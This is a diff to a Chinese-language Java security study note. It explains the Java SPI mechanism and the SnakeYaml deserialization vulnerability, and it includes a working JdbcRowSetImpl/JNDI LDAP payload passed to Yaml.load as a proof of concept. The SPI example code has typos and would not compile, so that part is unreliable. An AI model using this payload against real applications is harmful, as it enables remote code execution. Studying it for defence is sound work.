@@ -263,6 +263,80 @@ public class UnserDemo {
 
 <div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/2.png"></div>
 
+# Java SPI 机制
+## 简介
+`Java SPI`机制是`Java`提供的一套用来被第三方实现或者扩展的`API`, 它可以用来启动框架扩展和替换组件. 常见的`SPI`有`JDBC`, `Spring`, `Spring Boot`相关`starter`组件, `Dubbo`, `JNDI`, 日志接口等.
+  
+使用介绍:
+ - 当服务提供者提供了接口的一种具体实现后, 在`jar`包的`META-INF/services`目录下创建一个以"包名 + 接口名"为命名的文件, 内容为实现该接口的类的名称.
+ - 接口实现类所在的`jar`包放在主程序的`classpath`中.
+ - 主程序通过`java.util.ServiceLoder`动态装载实现模块, 通过在`META-INF/services`目录下的配置文件找到实现类的类名, 利用反射动态把类加载到`JVM`.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/3.png"></div>
+
+## 利用方式
+当运行`SPIMain`后, `Serviceloader`会根据配置文件`META-INF/services/SPI.IShout`获取到实现接口的类名, 实例化后返回到`IShout`中, 最终调用每个类实例的`shout`方法.
+
+ - SPI.IShout
+```java
+package SPI;
+
+public interface IShout {
+    void shout();
+}
+```
+
+ - SPI.Web
+```java
+package SPI;
+
+public class Web implenments IShout {
+    
+    @Override
+    public void shout() {
+        System.out.println("Web");
+    }
+}
+```
+
+ - SPIMain
+```java
+package SPI;
+
+import java.util.ServiceLoader;
+
+public class SPIMain() {
+
+    public class void main(String[] args) {
+        
+        ServiceLoader<IShout> shouts = ServiceLoad.load(IShout.class);
+        for (IShout s : shouts) {
+            s.shout();
+        }
+    }
+}
+```
+
+## 过程分析
+跟进`ServiceLoad.load(Class<S> service)`方法, 其先创建一个`ClassLoader`, 接着继续调用`ServiceLoad.load(Class<S> service, ClassLoader loader)`.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/4.png"></div>
+
+接着创建一个`ServiceLoader`对象, 跟进后调用`reload`方法, 返回一个`LazyIterator`的实例对象.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/5.png"></div>
+
+在`LazyIterator`对象中有两个参数, 分别是:
+ - service: 为要扫描的配置文件名.
+ - loader: 为当前线程的`ClassLoader`.
+
+当开始遍历这个对象时, 依次调用其`hasNext`, `hasNextService`, `nextService`方法, 在`nextService`中反射生成`Web`对象, 返回到`main`方法进行调用.
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/6.png"></div>
+
+## 安全风险
+当攻击者可以根据接口类写恶意的实现类, 并且能通过控制`jar`包中`META-INF/services`目录中的`SPI`配置文件时, 就会导致服务器端在通过`SPI`机制时调用攻击者写的恶意实现类导致任意代码执行.
+
 # SnakeYaml 反序列化漏洞
 ## 漏洞版本
 `SnakeYaml`全版本均可被反序列化漏洞利用
@@ -270,4 +344,30 @@ public class UnserDemo {
 ## 漏洞原理
 由于`SnakeYaml`是用来支持反序列化`Java`对象的, 因此当`Yaml.load`函数的参数外部参数可控时, 攻击者即可传入一个恶意类的`yaml`格式序列化内容, 利用服务端对`yaml`数据进行反序列化操作来达到`SnakeYaml`反序列化漏洞的利用.
 
-## 
+## 漏洞复现
+### JdbcRowSetImpl
+利用一下`Fastjson`中经典的`JdbcRowSetImpl`, 成功打通.
+
+```java
+package org.h3rmesk1t.SnakeYaml;
+
+import org.yaml.snakeyaml.Yaml;
+
+/**
+ * @Author: H3rmesk1t
+ * @Data: 2022/3/1 4:39 下午
+ */
+public class JdbcRowSetImplExploit {
+
+    public static void main(String[] args) {
+
+        String poc = "!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://127.0.0.1:1389/dx2zdj\"\n autoCommit: true";
+        Yaml yaml = new Yaml();
+        yaml.load(poc);
+    }
+}
+```
+
+<div align=center><img src="./Java安全学习—SnakeYaml反序列化漏洞/7.png"></div>
+
+### ScriptEngineManager
